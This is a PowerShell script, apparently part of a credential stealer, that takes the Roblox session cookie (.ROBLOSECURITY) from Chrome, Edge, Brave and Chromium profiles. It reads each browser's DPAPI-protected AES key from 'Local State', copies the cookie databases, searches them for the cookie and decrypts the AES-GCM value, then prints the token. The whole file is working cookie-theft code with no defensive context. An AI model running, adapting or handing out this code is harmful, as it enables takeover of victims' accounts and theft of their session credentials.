param()
Add-Type -AssemblyName System.Security

function Get-AesKey($browserBase) {
    $ls = Join-Path $browserBase "Local State"
    if (-not (Test-Path $ls)) { return $null }
    try {
        $json = Get-Content $ls -Raw -Encoding UTF8 | ConvertFrom-Json
        $b64 = $json.os_crypt.encrypted_key
        if (-not $b64) { return $null }
        $enc = [Convert]::FromBase64String($b64)
        $enc = $enc[5..($enc.Length-1)]
        return [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

function Decrypt-Value($bytes, $key) {
    try {
        $prefix = [System.Text.Encoding]::ASCII.GetString($bytes[0..2])
        if ($prefix -eq "v10" -or $prefix -eq "v11") {
            $nonce     = $bytes[3..14]
            $ciphertag = $bytes[15..($bytes.Length-1)]
            $cipher    = $ciphertag[0..($ciphertag.Length-17)]
            $tag       = $ciphertag[($ciphertag.Length-16)..($ciphertag.Length-1)]
            $aes = New-Object System.Security.Cryptography.AesGcm([byte[]]$key)
            $plain = New-Object byte[] $cipher.Length
            $aes.Decrypt([byte[]]$nonce, [byte[]]$cipher, [byte[]]$tag, $plain)
            $aes.Dispose()
            return [System.Text.Encoding]::UTF8.GetString($plain)
        } else {
            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            return [System.Text.Encoding]::UTF8.GetString($dec)
        }
    } catch { return "" }
}

function Get-RobloxCookie($browserBase) {
    $key = Get-AesKey $browserBase
    if (-not $key) { return "" }

    $profiles = @("Default","Profile 1","Profile 2","Profile 3","Profile 4","Profile 5")
    foreach ($profile in $profiles) {
        foreach ($sub in @("Network\Cookies","Cookies")) {
            $dbPath = Join-Path $browserBase "$profile\$sub"
            if (-not (Test-Path $dbPath)) { continue }
            try {
                $tmp = $env:TEMP + "\rbx_tmp_" + [System.Diagnostics.Process]::GetCurrentProcess().Id + ".db"
                Copy-Item $dbPath $tmp -Force -ErrorAction Stop
                $bytes = [System.IO.File]::ReadAllBytes($tmp)
                Remove-Item $tmp -Force -ErrorAction SilentlyContinue

                $nameBytes = [System.Text.Encoding]::UTF8.GetBytes(".ROBLOSECURITY")
                for ($i = 0; $i -lt ($bytes.Length - $nameBytes.Length - 20); $i++) {
                    $match = $true
                    for ($j = 0; $j -lt $nameBytes.Length; $j++) {
                        if ($bytes[$i+$j] -ne $nameBytes[$j]) { $match = $false; break }
                    }
                    if (-not $match) { continue }

                    $searchEnd = [Math]::Min($i + 4096, $bytes.Length - 32)
                    for ($k = $i; $k -lt $searchEnd; $k++) {
                        if ($bytes[$k] -eq 0x76 -and $bytes[$k+1] -eq 0x31 -and $bytes[$k+2] -eq 0x30) {
                            $blobLen = [Math]::Min(600, $bytes.Length - $k)
                            $blob = $bytes[$k..($k+$blobLen-1)]
                            $val = Decrypt-Value $blob $key
                            if ($val -and $val.Length -gt 100) { return $val }
                        }
                    }
                }
            } catch {}
        }
    }
    return ""
}

$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
    "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
    "$env:LOCALAPPDATA\Chromium\User Data"
)

foreach ($b in $browsers) {
    if (Test-Path $b) {
        $cookie = Get-RobloxCookie $b
        if ($cookie -and $cookie.Length -gt 100) {
            Write-Output $cookie
            exit 0
        }
    }
}
Write-Output ""
exit 0
